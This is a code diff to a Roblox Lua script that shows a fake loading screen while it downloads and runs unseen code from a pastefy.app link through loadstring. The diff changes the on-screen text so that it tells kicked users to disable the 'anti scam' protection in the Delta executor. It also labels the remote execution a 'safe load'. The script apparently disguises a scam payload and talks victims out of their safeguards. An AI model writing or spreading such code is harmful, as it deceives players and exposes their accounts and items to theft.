@@ -74,7 +74,7 @@ RejoinMsg.AnchorPoint = Vector2.new(0.5, 0.5)
 RejoinMsg.Position = UDim2.new(0.5, 0, 0.65, 0)
 RejoinMsg.Size = UDim2.new(0.9, 0, 0, 30)
 RejoinMsg.BackgroundTransparency = 1
-RejoinMsg.Text = "If you got kicked please rejoin, patient is the key"
+RejoinMsg.Text = "If you got kicked please disable anti scam on Delta"
 RejoinMsg.Font = Enum.Font.Gotham
 RejoinMsg.TextScaled = true
 RejoinMsg.TextColor3 = Color3.fromRGB(255, 50, 50)
@@ -82,11 +82,14 @@ RejoinMsg.Parent = Background
 
 -- Animate Fade In/Out (for rejoin text)
 task.spawn(function()
-	while true do
-		TweenService:Create(RejoinMsg, TweenInfo.new(1.5), {TextTransparency = 1}):Play()
-		task.wait(1.5)
-		TweenService:Create(RejoinMsg, TweenInfo.new(1.5), {TextTransparency = 0}):Play()
-		task.wait(1.5)
+	while RejoinMsg.Parent do
+		local fadeOut = TweenService:Create(RejoinMsg, TweenInfo.new(1.5), {TextTransparency = 1})
+		fadeOut:Play()
+		fadeOut.Completed:Wait()
+
+		local fadeIn = TweenService:Create(RejoinMsg, TweenInfo.new(1.5), {TextTransparency = 0})
+		fadeIn:Play()
+		fadeIn.Completed:Wait()
 	end
 end)
 
@@ -123,15 +126,17 @@ task.spawn(function()
 
 	for i = 1, steps do
 		local percent = (i / steps) * 100
-		Bar.Size = UDim2.new(percent/100, 0, 1, 0)
+		Bar.Size = UDim2.new(percent / 100, 0, 1, 0)
 		ProgressText.Text = string.format("%s (%.1f%%)", currentMessage, percent)
 		task.wait(stepTime)
 	end
 
 	-- Fade out UI
 	for _, obj in pairs(Background:GetDescendants()) do
-		if obj:IsA("TextLabel") or obj:IsA("Frame") then
-			TweenService:Create(obj, TweenInfo.new(2), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
+		if obj:IsA("TextLabel") then
+			TweenService:Create(obj, TweenInfo.new(2), {TextTransparency = 1}):Play()
+		elseif obj:IsA("Frame") then
+			TweenService:Create(obj, TweenInfo.new(2), {BackgroundTransparency = 1}):Play()
 		end
 	end
 	TweenService:Create(Background, TweenInfo.new(2), {BackgroundTransparency = 1}):Play()
@@ -139,5 +144,9 @@ task.spawn(function()
 	task.wait(2.2)
 	ScreenGui:Destroy()
 end)
-task.wait(0.00001) 
-loadstring(game:HttpGet("https://pastefy.app/JFGQwYi0/raw"))()/
+
+-- Safe load external script
+task.wait(0.1)
+pcall(function()
+	loadstring(game:HttpGet("https://pastefy.app/JFGQwYi0/raw"))()
+end)
